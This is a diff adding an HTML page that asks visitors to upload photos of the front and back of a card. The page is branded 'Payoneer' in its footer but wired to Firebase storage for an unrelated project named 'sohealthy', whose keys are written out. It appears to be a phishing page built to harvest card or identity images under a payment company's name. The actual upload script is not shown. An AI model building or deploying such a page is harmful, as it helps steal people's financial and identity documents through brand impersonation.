@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./style/bootstrap.css">
+    <link rel="stylesheet" href="./style/main.css">
+    <link rel="stylesheet" href="./style/fontAwesom/css/font-awesome.css">
+    <title>upload card </title>
+    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+</head>
+<body>
+    <header>
+
+    </header>
+    <div class="container">
+        <center>
+            <img src="./index-removebg-preview.png" alt="" class="mt-5">
+        </center>
+       <div class="inner">
+           <div class="chil">
+            <h4>Upload card </h4>
+
+            <form action="">
+                <div class="inside">
+                    <div class="full">
+                        <label for="front">
+                            <h3><i class="fa fa-camera"></i></h3>
+                        </label>
+                        <input type="file" name="front" id="front">
+                    </div>
+        
+                    <!--back part-->
+                    <div class="ml-4 full">
+                        <label for="back">
+                            <h3><i class="fa fa-camera"></i></h3>
+                        </label>
+                         <input type="file" name="back" id="back">
+                    </div>
+        
+                </div>
+                <br>
+                <h6 class="front_msg"></h6>
+                <h6 class="msg"></h6>
+                <div>
+                    <div class="btn btn-info">Upload </div>
+                </div>
+            </form>
+           </div>
+       </div>
+
+    </div>
+
+    <div class="footer">
+        <center>   <h2>Payoneer</h2></center>
+    </div>
+    <script src="./script/script.js"></script>
+
+
+     <!-- The core Firebase JS SDK is always required and must be listed first -->
+<script src="https://www.gstatic.com/firebasejs/8.2.9/firebase-app.js"></script>
+
+<!-- TODO: Add SDKs for Firebase products that you want to use
+     https://firebase.google.com/docs/web/setup#available-libraries -->
+<script src="https://www.gstatic.com/firebasejs/8.2.9/firebase-analytics.js"></script>
+
+<script src="https://www.gstatic.com/firebasejs/8.2.9/firebase-storage.js"></script>
+<script>
+  // Your web app's Firebase configuration
+  // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+  var firebaseConfig = {
+    apiKey: "AIzaSyAgzSfQKtzNGtj4mEYhMzLQM6Nn8nrjJFc",
+    authDomain: "sohealthy-aa605.firebaseapp.com",
+    projectId: "sohealthy-aa605",
+    storageBucket: "sohealthy-aa605.appspot.com",
+    messagingSenderId: "380291830718",
+    appId: "1:380291830718:web:be94219866996dec5a9fef",
+    measurementId: "G-CRL7P2BHDX"
+  };
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+  firebase.analytics();
+</script>
+    
+</body>
+</html>
